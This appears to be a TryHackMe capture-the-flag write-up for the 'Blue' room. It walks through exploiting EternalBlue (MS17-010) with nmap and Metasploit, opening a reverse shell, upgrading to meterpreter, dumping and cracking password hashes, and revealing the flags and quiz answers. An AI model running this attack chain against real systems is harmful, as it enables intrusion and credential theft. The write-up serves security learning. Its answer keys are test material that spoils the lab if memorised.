---
tags: [tryhackme, exploit, easy]
categories: [tryhackme, exploit, easy]
icon: chevron-right
author: Ivo Muijtjens
date: 2022-05-26
---
![](/static/headers/blue.png)

# Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues. The Blue CTF is an easy box based on the EternalBlue vulnerability [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/CVE-2017-0143). As preparation for this room, I recommend following the Windows Exploration Basics path to get familair with the commands:

[!ref target="blank" text="Windows Fundamentals 1" icon="../static/icons/fundamentals1.png"](https://tryhackme.com/room/windowsfundamentals1xbx)
[!ref target="blank" text="Windows Fundamentals 2" icon="../static/icons/fundamentals2.png"](https://tryhackme.com/room/windowsfundamentals2x0x)
[!ref target="blank" text="Active Directory Basics" icon="../static/icons/activedirectory.png"](https://tryhackme.com/room/activedirectorybasics)
[!ref target="blank" text="Metasploit: Introduction" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/metasploitintro)
[!ref target="blank" text="Metasploit: Exploitation" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/metasploitexploitation)
[!ref target="blank" text="Metasploit: Meterpreter" icon="../static/icons/metasploit.png"](https://tryhackme.com/room/meterpreter)

---

# Writeup

### Reconnaissance

**How many ports are open with a port number under 1000?**

To answer this question I used nmap to scan for open ports and vulnerabilities.

    nmap -sV -p 1-999 --script vuln 10.10.209.54

`-sV` enumerate versions

`-p 1-999` scan all ports under 1000

`--script vuln` argument to scan vulnerabilities

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 11:10 EDT
    Nmap scan report for 10.10.209.54
    Host is up (0.028s latency).
    Not shown: 996 closed tcp ports (conn-refused)
    PORT    STATE SERVICE      VERSION
    135/tcp open  msrpc        Microsoft Windows RPC
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_smb-vuln-ms10-054: false
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.25 seconds

==- Reveal Answer
3
===

**What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)**

Review the nmap output for the answer to this question.

==- Reveal Answer
ms17-010
===

### Gain Access

**Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**

Start Metasploit with the `msfconsole` command in your terminal. Once Metasploit Framework is initialized, we can search the vulnaribility with command: `search ms17-010`.

    Matching Modules
    ================

    #  Name                                      Disclosure Date  Rank     Check  Description
    -  ----                                      ---------------  ----     -----  -----------
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

In this case I'm interested in the EternalBlue exploit. Use the command `use 0` to select the exploit. You can also use the full name of the exploit with command `use exploit/windows/smb/ms17_010_eternalblue`.

==- Reveal Answer
exploit/windows/smb/ms17_010_eternalblue
===

**Show options and set the one required value. What is the name of this value? (All caps for submission)**

After selecting the exploit we can show the module options with the command `show options`. Analyze the output of this command. There is one required setting that's not predefined.

    Module options (exploit/windows/smb/ms17_010_eternalblue):

    Name           Current Setting  Required  Description
    ----           ---------------  --------  -----------
    RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT          445              yes       The target port (TCP)
    SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
    SMBPass                         no        (Optional) The password for the specified username
    SMBUser                         no        (Optional) The username to authenticate as
    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

==- Reveal Answer
RHOSTS
===

Before we run the exploit, we first select a payload and some options. To find your IP address run the `ifconfig` command and look for the `tun0` interface.

`set payload windows/x64/shell/reverse_tcp`

`set RHOSTS <SERVER IP ADDRESS>`

`set LHOST <YOUR IP ADDRESS>`

With that done, run the exploit. You can run the exploit with either the `run` or `exploit` command.

![Exploit is running](/static/images/exploit-blue.png)

!!!
The exploit is running successfully if you see the Windows shell: `C:\Windows\system32>`.
!!!

### Privilege Escalation

**If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)**

Background the shell now with <kbd>CTRL</kbd> + <kbd>Z</kbd>.

==- Reveal Answer
`use post/multi/manage/shell_to_meterpreter`
===

**Select this (use MODULE_PATH). Show options, what option are we required to change?**

Type in the command `use post/multi/manage/shell_to_meterpreter`. Now use `show options` to list the arguments. What option is required but not set?

    Module options (post/multi/manage/shell_to_meterpreter):                                                                                                                      
                                                                                                                                                                                
    Name     Current Setting  Required  Description                                                                                                                            
    ----     ---------------  --------  -----------                                                                                                                            
    HANDLER  true             yes       Start an exploit/multi/handler to receive the connection                                                                               
    LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).                                                
    LPORT    4433             yes       Port for payload to connect to.                                                                                                        
    SESSION                   yes       The session to run this module on

==- Reveal Answer
SESSION
===

Now type `sessions` in your terminal. Set the session with command `set SESSION <SESSION_ID>`.

    Active sessions                                                                                                                                                               
    ===============                                                                                                                                                               
                                                                                                                                                                                
    Id  Name  Type               Information                                               Connection                                                                           
    --  ----  ----               -----------                                               ----------                                                                           
    1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -> 10.10.209.54:49233 (10.10.209.54)

Run the post exploit using command `run`. If it doesn't work the first time, run the exploit again.

    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on 10.18.96.75:4433 
    [*] Post module execution completed
    msf6 post(multi/manage/shell_to_meterpreter) > 
    [*] Sending stage (200774 bytes) to 10.10.209.54
    [*] Meterpreter session 2 opened (10.18.96.75:4433 -> 10.10.209.54:49261) at 2022-05-26 12:22:59 -0400
    [*] Stopping exploit/multi/handler

This will create a second session. Type in `sessions` to list them both. Note that session 2 is the meterpreter session.

    Active sessions
    ===============

    Id  Name  Type                     Information                                               Connection
    --  ----  ----                     -----------                                               ----------
    1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.96.75:4444 -> 10.10.209.54:49233 (10.10.209.54)
    2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.96.75:4433 -> 10.10.209.54:49261 (10.10.209.54)

To get in the meterpreter session use the command `sessions <SESSION_ID>`. Now run the `getsystem` command to verify if we successfully escalated our privileges to `NT AUTHORITY\SYSTEM`.

    meterpreter > getsystem
    [-] Already running as SYSTEM

Now run the `ps` command to list all the running processes on the traget machine.

![Running processes on target machine](/static/images/ps-blue.png)

Migrate a process that is running under `NT AUTHORITY\SYSTEM` with the command `migrate [pid]`. It case it fails, chose another process id.

    meterpreter > migrate 700
    [*] Migrating from 1448 to 700...
    [*] Migration completed successfully.

### Cracking

**Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**

Run the `hashdump` command within the meterpreter session.

    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

==- Reveal Answer
Jon
===

**Copy this password hash to a file and research how to crack it. What is the cracked password?**

Copy the hash `ffb43f0de35be4d9917ac0cc8ad57f8d` into [CrackStation](https://crackstation.net/) to reveal the password, or use John the Ripper: `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt`. Create a text-file with the hash.

==- Reveal Answer
alqfna22
===

### Find Flags!

Background the meterpreter session with command `background` and start the shell session with command `sessions <SESSION_ID>`.

**Flag1? This flag can be found at the system root.**

Change directory to `C:\` and run the `dir` command.

    C:\Windows\system32>cd C:\
    cd C:\

    C:\>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is E611-0B66

    Directory of C:\

    03/17/2019  02:27 PM                24 flag1.txt
    07/13/2009  10:20 PM    <DIR>          PerfLogs
    04/12/2011  03:28 AM    <DIR>          Program Files
    03/17/2019  05:28 PM    <DIR>          Program Files (x86)
    12/12/2018  10:13 PM    <DIR>          Users
    03/17/2019  05:36 PM    <DIR>          Windows
                1 File(s)             24 bytes
                5 Dir(s)  20,369,653,760 bytes free

Use the command `type flag1.txt` to print the content of the file to your terminal.

==- Reveal Flag 1
flag\{access_the_machine\}
===

**Flag2? This flag can be found at the location where passwords are stored within Windows.**

The command `dir *flag*.* /s` will reveal the location of where the flags are stored.

`type C:\Windows\System32\config\flag2.txt`

==- Reveal Flag 2
flag\{sam_database_elevated_access\}
===

**Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**

`type C:\Users\Jon\Documents\flag3.txt`

==- Reveal Flag 3
flag\{admin_documents_can_be_valuable\}
===

!!!success
Congratiulations, you've completed the room.
!!!